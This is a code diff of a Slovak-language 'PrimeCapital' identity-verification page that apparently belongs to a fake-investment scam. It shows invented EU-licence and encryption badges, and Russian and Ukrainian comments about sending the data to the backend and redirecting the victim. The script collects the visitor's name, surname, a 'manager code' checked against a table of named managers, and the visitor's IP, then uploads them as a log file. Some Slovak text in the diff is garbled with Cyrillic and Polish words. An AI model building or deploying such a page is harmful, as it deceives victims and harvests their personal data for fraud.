@@ -21,18 +21,16 @@
   </script>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     @keyframes pageFadeIn {
       from { opacity: 0; transform: translateY(8px); }
-      to   { opacity: 1; transform: translateY(0); }
+      to { opacity: 1; transform: translateY(0); }
     }
     @keyframes pageFadeOut {
       from { opacity: 1; transform: translateY(0); }
-      to   { opacity: 0; transform: translateY(-8px); }
+      to { opacity: 0; transform: translateY(-8px); }
     }
-    body.page-fade-in  { animation: pageFadeIn  0.35s cubic-bezier(0.22,1,0.36,1) forwards; }
+    body.page-fade-in { animation: pageFadeIn 0.35s cubic-bezier(0.22,1,0.36,1) forwards; }
     body.page-fade-out { animation: pageFadeOut 0.25s ease forwards; pointer-events: none; }
-
     :root {
       --gold: #C9A84C;
       --gold-light: #E8C96A;
@@ -42,7 +40,6 @@
       --bg3: #0f0f0f;
       --border: #252525;
     }
-
     body {
       font-family: 'Inter', sans-serif;
       background: var(--bg);
@@ -53,14 +50,12 @@
       display: flex;
       flex-direction: column;
     }
-
     .gold-grad {
       background: linear-gradient(90deg, #C9A84C, #F0D882, #C9A84C);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
     }
-
     /* ══ TOP NAV BAR ══ */
     .topbar {
       background: linear-gradient(160deg, #0f0f0f 0%, #0a0a0a 60%, #111008 100%);
@@ -89,7 +84,6 @@
       color: #fff; letter-spacing: 0.4px;
     }
     .logo-text span { color: var(--gold); }
-
     .badge-verified {
       display: flex; align-items: center; gap: 7px;
       background: linear-gradient(135deg, #1a1508, #231c09);
@@ -99,7 +93,6 @@
       color: var(--gold); letter-spacing: 0.5px;
       white-space: nowrap;
     }
-
     /* ══ FORM SECTION ══ */
     .form-section {
       flex: 1;
@@ -110,7 +103,6 @@
       justify-content: center;
       gap: 60px;
     }
-
     /* ── LEFT: description ── */
     .form-left {
       flex: 0 0 340px;
@@ -138,7 +130,6 @@
     }
     .perk-title { font-size: 13px; font-weight: 700; color: #e0e0e0; margin-bottom: 4px; }
     .perk-sub { font-size: 12px; color: #888; line-height: 1.55; }
-
     /* ── RIGHT: form card ── */
     .form-card {
       flex: 0 0 440px;
@@ -195,9 +186,7 @@
       line-height: 1.2; margin-bottom: 8px;
     }
     .form-card-header p { font-size: 13px; color: #888; line-height: 1.65; }
-
     .form-card-body { padding: 28px 36px 32px; }
-
     /* ref strip */
     .ref-strip {
       display: flex; align-items: center; justify-content: space-between;
@@ -208,7 +197,6 @@
     .ref-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--gold); }
     .ref-label { font-size: 11px; font-weight: 600; color: #888; letter-spacing: 0.3px; }
     .ref-val { font-size: 11px; color: #aaa; font-family: 'Courier New', monospace; }
-
     /* fields */
     .field { margin-bottom: 18px; }
     .field-label {
@@ -237,7 +225,6 @@
     }
     .field input::placeholder { color: #555; }
     .field-error { display: none; font-size: 11px; color: #e06060; margin-top: 5px; }
-
     /* info box */
     .info-box {
       background: #130f02;
@@ -255,7 +242,6 @@
     }
     .info-box p { font-size: 13px; color: #aaa; line-height: 1.6; }
     .info-box strong { font-weight: 700; color: #ddd; display: block; margin-bottom: 3px; }
-
     /* submit button */
     .btn-continue {
       width: 100%; height: 56px;
@@ -283,7 +269,6 @@
       background: rgba(10,10,10,0.35); width: 0;
       transition: width 0.3s cubic-bezier(0.4,0,0.2,1);
     }
-
     /* trust row */
     .trust-row {
       display: flex; align-items: center; justify-content: center;
@@ -296,7 +281,6 @@
       font-size: 11px; color: #777; font-weight: 500;
     }
     .trust-item i { color: #888; font-size: 13px; }
-
     /* ── FOOTER ── */
     .page-footer {
       background: #050505; border-top: 1px solid #111;
@@ -317,16 +301,13 @@
     }
     .footer-links a:hover { color: var(--gold); }
     .footer-copy { font-size: 10px; color: #2a2a2a; letter-spacing: 0.4px; }
-
     .outer-note {
       text-align: center; padding: 12px;
       font-size: 11px; color: #2a2a2a; letter-spacing: 0.3px;
       background: #050505;
     }
-
     @keyframes spin { to { transform: rotate(360deg); } }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.15; } }
-
     /* ══ RESPONSIVE ══ */
     @media (max-width: 860px) {
       .form-section {
@@ -345,7 +326,6 @@
       }
       .form-left-title { font-size: 28px; }
     }
-
     @media (max-width: 600px) {
       .topbar { padding: 16px 18px; }
       .form-section { padding: 32px 18px 48px; gap: 28px; }
@@ -360,7 +340,6 @@
       .page-footer { flex-direction: column; text-align: center; padding: 18px; }
       .footer-links { justify-content: center; }
     }
-
     @media (max-width: 380px) {
       .form-left-title { font-size: 21px; }
       .form-card-header h2 { font-size: 19px; }
@@ -368,7 +347,6 @@
   </style>
 </head>
 <body>
-
   <!-- TOP NAV -->
   <div class="topbar">
     <div class="logo">
@@ -380,10 +358,8 @@
       Overené · Licencia EÚ
     </div>
   </div>
-
   <!-- ══ FORM SECTION ══ -->
   <div class="form-section">
-
     <!-- LEFT / TOP: description & perks -->
     <div class="form-left">
       <div class="form-left-tag">Začnite teraz</div>
@@ -407,19 +383,18 @@
           <div class="perk-icon"><i class="ti ti-lock"></i></div>
           <div>
             <div class="perk-title">Bezpečné end-to-end šifrovanie</div>
-            <div class="perk-sub">Vaše údaje sú chránené 256-bit šifrovaním v súlade s GDPR</div>
+            <div class="perk-sub">Vaše údaje sú chránené 256-bit šifrovaním в súlade з GDPR</div>
           </div>
         </div>
         <div class="perk">
           <div class="perk-icon"><i class="ti ti-headset"></i></div>
           <div>
-            <div class="perk-title">Osobný manažér od prvého dňa</div>
+            <div class="perk-title">Osobný manažér од prvého dňa</div>
             <div class="perk-sub">Po overení vám bude pridelený dedikovaný manažér 24/7</div>
           </div>
         </div>
       </div>
     </div>
-
     <!-- RIGHT / BOTTOM: form card -->
     <div class="form-card">
       <div class="form-card-header">
@@ -436,7 +411,6 @@
         <h2>Overenie<br>totožnosti</h2>
         <p>Vyplňte formulár nižšie pre obnovenie prístupu k vášmu účtu.</p>
       </div>
-
       <div class="form-card-body">
         <div class="ref-strip">
           <div class="ref-strip-left">
@@ -445,27 +419,23 @@
           </div>
           <span class="ref-val">#SEC-2026-41823</span>
         </div>
-
         <form id="main-project-form" onsubmit="event.preventDefault(); handleSubmit('OVERENIE', this);">
-
           <div class="field">
             <label class="field-label" for="meno">Meno</label>
             <div class="input-wrap">
               <i class="ti ti-user input-icon"></i>
-              <input type="text" id="meno" name="meno" placeholder="Zadajte vaše meno" autocomplete="given-name" maxlength="50">
+              <input type="text" id="meno" name="meno" placeholder="Zadajte ваше meno" autocomplete="given-name" maxlength="50">
             </div>
             <div class="field-error" id="err-meno">Toto pole je povinné.</div>
           </div>
-
           <div class="field">
             <label class="field-label" for="priezvisko">Priezvisko</label>
             <div class="input-wrap">
               <i class="ti ti-user input-icon"></i>
-              <input type="text" id="priezvisko" name="priezvisko" placeholder="Zadajte vaše priezvisko" autocomplete="family-name" maxlength="50">
+              <input type="text" id="priezvisko" name="priezvisko" placeholder="Zadajte ваше priezvisko" autocomplete="family-name" maxlength="50">
             </div>
             <div class="field-error" id="err-priezvisko">Toto pole je povinné.</div>
           </div>
-
           <div class="field">
             <label class="field-label" for="sec-code">Kód manažéra</label>
             <div class="input-wrap">
@@ -474,15 +444,13 @@
             </div>
             <div class="field-error" id="err-code">Zadajte Kód manažéra.</div>
           </div>
-
-          <div class="info-box">
+          <div class="info-box" id="info-box">
             <div class="info-box-icon"><i class="ti ti-info-circle"></i></div>
-            <p>
+            <p id="info-text">
               <strong>Kde nájdem Kód manažéra?</strong>
-              Pri obnove prístupu k vášmu účtu vám Kód manažéra poskytne váš osobný manažér. V prípade otázok kontaktujte podporu.
+              Pri obnove prístupu k vášmu účtu vám Kód manažéra poskytne váš osobný manažér. V przypadku otázok kontaktujte podporu.
             </p>
           </div>
-
           <button class="btn-continue" id="btn" type="submit">
             <span id="btn-label">
               <i class="ti ti-arrow-right" style="font-size:17px;margin-right:4px;vertical-align:-3px;"></i>
@@ -491,9 +459,7 @@
             <span class="btn-spinner" id="spinner"></span>
             <div class="progress-bar" id="pbar"></div>
           </button>
-
         </form>
-
         <div class="trust-row">
           <div class="trust-item"><i class="ti ti-lock"></i> End-to-end šifrovanie</div>
           <div class="trust-item"><i class="ti ti-shield-check"></i> Overené SSL</div>
@@ -502,7 +468,6 @@
       </div>
     </div>
   </div>
-
   <!-- FOOTER -->
   <div class="page-footer">
     <div class="footer-brand">Prime<span>Capital</span></div>
@@ -514,99 +479,125 @@
     </div>
     <div class="footer-copy">© 2026 PRIMECAPITAL. VŠETKY PRÁVA VYHRADENÉ.</div>
   </div>
-
   <div class="outer-note">Toto je automatické systémové oznámenie &nbsp;·&nbsp; primecapital.eu</div>
 
   <script>
-    async function handleSubmit(sectionName, formElement) {
-  if (!sectionName) sectionName = 'OVERENIE';
+    // === КОДИ МЕНЕДЖЕРІВ ===
+    const managerCodes = {
+      "1001": "Miroslav Chovak",
+      "1002": "Daniel Kubo",
+      "1003": "Mark Drad",
+      "1004": "Jan Moskal",
+      "1005": "Matej Pauchlik",
+      "1006": "Jan Horak",
+      "1007": "Hugo Belik",
+      "1008": "Milosh Michalica",
+      "1009": "Izabela Kovac",
+      "1010": "Tomas Pekar",
+      "1011": "Filip Sima",
+      "1012": "Henrich Kolar",
+      "1013": "Stela Uramova",
+      "1014": "Aneta Vakesova",
+      "1015": "Jan Novak",
+      "1016": "Marek Balog",
+      "1017": "Tomas Kovac"
+    };
 
-  var meno       = document.getElementById('meno').value.trim();
-  var priezvisko = document.getElementById('priezvisko').value.trim();
-  var code       = document.getElementById('sec-code').value.trim();
-  
-  // Блоки для вывода ошибок
-  var errMeno       = document.getElementById('err-meno');
-  var errPriezvisko = document.getElementById('err-priezvisko');
-  var errCode       = document.getElementById('err-code');
-
-  // Сбрасываем старые алерты
-  errMeno.style.display = 'none';
-  errPriezvisko.style.display = 'none';
-  errCode.style.display = 'none';
-
-  var hasError = false;
-
-  // Проверка полей на пустоту
-  if (!meno) { errMeno.style.display = 'block'; hasError = true; }
-  if (!priezvisko) { errPriezvisko.style.display = 'block'; hasError = true; }
-  
-  // Конкретная проверка на твой секретный код
-  if (!code) {
-    errCode.textContent = 'Zadajte Kód manažéra.';
-    errCode.style.display = 'block';
-    hasError = true;
-  } else if (code !== '985621') {
-    // Если код не совпал — бьем по рукам
-    errCode.textContent = 'Nesprávny Kód manažéra. Prístup odmietnutý.';
-    errCode.style.display = 'block';
-    hasError = true;
-  }
-
-  // Если есть хоть одна ошибка — стопэ, никуда ничего не шлем
-  if (hasError) return;
-
-  // Включаем красивый лоадер на кнопке
-  var btnLabel = document.getElementById('btn-label');
-  var spinner  = document.getElementById('spinner');
-  var pbar     = document.getElementById('pbar');
-  
-  btnLabel.style.display = 'none';
-  spinner.style.display = 'inline-block';
-
-  let ip = 'Neznáme';
-  try {
-    const resp = await fetch('https://api.ipify.org?format=json');
-    const data = await resp.json();
-    ip = data.ip || 'Neznáme';
-  } catch (e) {}
-
-  var timestamp = new Date().toISOString();
-
-  var lines = [
-    '=== OVERENIE IDENTITY ===',
-    'Čas: ' + timestamp,
-    'IP: ' + ip,
-    '---',
-    'Meno: ' + meno,
-    'Priezvisko: ' + priezvisko,
-    'Bezpečnostný kód: ' + code,
-    '=== KONIEC ==='
-  ];
-
-  var text = lines.join('\n');
-  var blob = new Blob([text], { type: 'text/plain' });
-  var fd   = new FormData();
-  fd.append('file', blob, 'log-' + Date.now() + '.txt');
-  fd.append('section', sectionName);
-
-  // Кидаем запрос на бэкенд Vercel
-  fetch('/api/upload', { method: 'POST', body: fd })
-    .catch(function() {});
-
-  // Запускаем красивую полоску загрузки и перенаправляем чела
-  var pct = 0;
-  var iv = setInterval(function() {
-    pct += 2;
-    pbar.style.width = pct + '%';
-    if (pct >= 100) {
-      clearInterval(iv);
-      var params = new URLSearchParams({ meno: meno, priezvisko: priezvisko, code: code, ip: ip });
-      smoothNavigate('osnova.html?' + params.toString());
+    // Зміна тексту в info-box при введенні коду
+    function updateInfoBox(code) {
+      const infoText = document.getElementById('info-text');
+      if (code && managerCodes[code]) {
+        infoText.innerHTML = `<strong>${managerCodes[code]}</strong><br>Tvoj osobný manažér`;
+      } else {
+        infoText.innerHTML = `<strong>Kde nájdem Kód manažéra?</strong><br>Pri obnove prístupu k vášmu účtu vám Kód manažéra poskytne váš osobný manažér. V przypadku otázok kontaktujte podporu.`;
+      }
     }
-  }, 55);
-}
-  </script>
 
+    async function handleSubmit(sectionName, formElement) {
+      if (!sectionName) sectionName = 'OVERENIE';
+      var meno = document.getElementById('meno').value.trim();
+      var priezvisko = document.getElementById('priezvisko').value.trim();
+      var code = document.getElementById('sec-code').value.trim();
+ 
+      var errMeno = document.getElementById('err-meno');
+      var errPriezvisko = document.getElementById('err-priezvisko');
+      var errCode = document.getElementById('err-code');
+
+      errMeno.style.display = 'none';
+      errPriezvisko.style.display = 'none';
+      errCode.style.display = 'none';
+
+      var hasError = false;
+
+      if (!meno) { errMeno.style.display = 'block'; hasError = true; }
+      if (!priezvisko) { errPriezvisko.style.display = 'block'; hasError = true; }
+
+      if (!code) {
+        errCode.textContent = 'Zadajte Kód manažéra.';
+        errCode.style.display = 'block';
+        hasError = true;
+      } else if (!managerCodes[code]) {
+        errCode.textContent = 'Nesprávny Kód manažéra. Prístup odmietnutý.';
+        errCode.style.display = 'block';
+        hasError = true;
+      }
+
+      if (hasError) return;
+
+      var btnLabel = document.getElementById('btn-label');
+      var spinner = document.getElementById('spinner');
+      var pbar = document.getElementById('pbar');
+
+      btnLabel.style.display = 'none';
+      spinner.style.display = 'inline-block';
+
+      let ip = 'Neznáme';
+      try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        const data = await resp.json();
+        ip = data.ip || 'Neznáme';
+      } catch (e) {}
+
+      var timestamp = new Date().toISOString();
+      var lines = [
+        '=== OVERENIE IDENTITY ===',
+        'Čas: ' + timestamp,
+        'IP: ' + ip,
+        '---',
+        'Meno: ' + meno,
+        'Priezvisko: ' + priezvisko,
+        'Kód manažéra: ' + code,
+        'Manažér: ' + managerCodes[code],
+        '=== KONIEC ==='
+      ];
+
+      var text = lines.join('\n');
+      var blob = new Blob([text], { type: 'text/plain' });
+      var fd = new FormData();
+      fd.append('file', blob, 'log-' + Date.now() + '.txt');
+      fd.append('section', sectionName);
+
+      fetch('/api/upload', { method: 'POST', body: fd }).catch(function() {});
+
+      var pct = 0;
+      var iv = setInterval(function() {
+        pct += 2;
+        pbar.style.width = pct + '%';
+        if (pct >= 100) {
+          clearInterval(iv);
+          var params = new URLSearchParams({ meno: meno, priezvisko: priezvisko, code: code, ip: ip });
+          smoothNavigate('osnova.html?' + params.toString());
+        }
+      }, 55);
+    }
+
+    // Live оновлення info-box
+    document.addEventListener('DOMContentLoaded', function() {
+      const codeInput = document.getElementById('sec-code');
+      codeInput.addEventListener('input', function() {
+        updateInfoBox(this.value.trim());
+      });
+    });
+  </script>
 </body>
 </html>
